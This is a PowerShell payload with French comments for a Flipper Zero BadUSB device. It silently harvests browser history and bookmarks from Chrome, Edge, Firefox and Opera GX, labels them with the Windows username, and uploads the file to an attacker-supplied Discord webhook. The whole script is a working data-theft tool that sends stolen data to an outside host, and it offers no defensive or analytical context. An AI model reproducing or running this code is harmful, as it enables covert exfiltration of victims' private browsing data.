# ===================================================
# Script PowerShell : BrowserData → Discord (via pièce jointe)
# Compatible Flipper Zero BadUSB
# ===================================================

# ---------------- Variables ----------------------
# $dc est défini par le .txt du Flipper avant l'appel
# Exemple dans le .txt :
# $dc='https://discord.com/api/webhooks/ID/TOKEN'

# Fichier temporaire pour stocker les données
$TempFile = "$env:TMP\--BrowserData.txt"

# Supprimer ancien fichier si présent
if (Test-Path $TempFile) { Remove-Item $TempFile -Force }

# ---------------- Fonction collecte des données ----------------------
function Get-BrowserData {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)][string]$Browser,
        [Parameter(Mandatory = $true)][string]$DataType
    )

    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

    # Chemins selon navigateur et type
    if ($Browser -eq 'chrome'  -and $DataType -eq 'history')    { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History" }
    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks'){ $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks" }
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history')   { $Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History" }
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks') { $Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks" }
    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history')   { $Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" }
    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history')   { $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History" }
    elseif ($Browser -eq 'opera'   -and $DataType -eq 'bookmarks') { $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks" }

    try {
        $Value = Get-Content -Path $Path -ErrorAction Stop | Select-String -AllMatches $Regex | % { ($_.Matches).Value } | Sort-Object -Unique
    } catch { return }

    # Exporter chaque URL avec info utilisateur + navigateur
    $Value | ForEach-Object {
        [PSCustomObject]@{
            Browser = $Browser
            User    = $env:UserName
            DataType= $DataType
            Data    = $_
        }
    } | Export-Csv -Path $TempFile -Append -NoTypeInformation
}

# ---------------- Collecte tous les navigateurs ----------------------
$Browsers = @(
    @{Browser='edge'; DataType='history'},
    @{Browser='edge'; DataType='bookmarks'},
    @{Browser='chrome'; DataType='history'},
    @{Browser='chrome'; DataType='bookmarks'},
    @{Browser='firefox'; DataType='history'},
    @{Browser='opera'; DataType='history'},
    @{Browser='opera'; DataType='bookmarks'}
)

foreach ($b in $Browsers) {
    Get-BrowserData -Browser $b.Browser -DataType $b.DataType
}

# ---------------- Fonction envoi Discord (pièce jointe) ----------------------
function Upload-Discord {
    param (
        [string]$file
    )

    if (-not ([string]::IsNullOrEmpty($dc)) -and (Test-Path $file)) {
        # Envoi en multipart/form-data
        $form = @{
            "file1" = Get-Item $file
        }
        try {
            Invoke-RestMethod -Uri $dc -Method Post -Form $form
        } catch {
            # Si échec, afficher l’erreur (utile pour débogage)
            Write-Output "Erreur en envoyant le fichier : $_"
        }
    }
}

# ---------------- Envoyer le fichier ----------------------
Upload-Discord -file $TempFile

# ---------------- Nettoyage optionnel ----------------------
# Remove-Item $TempFile -Force
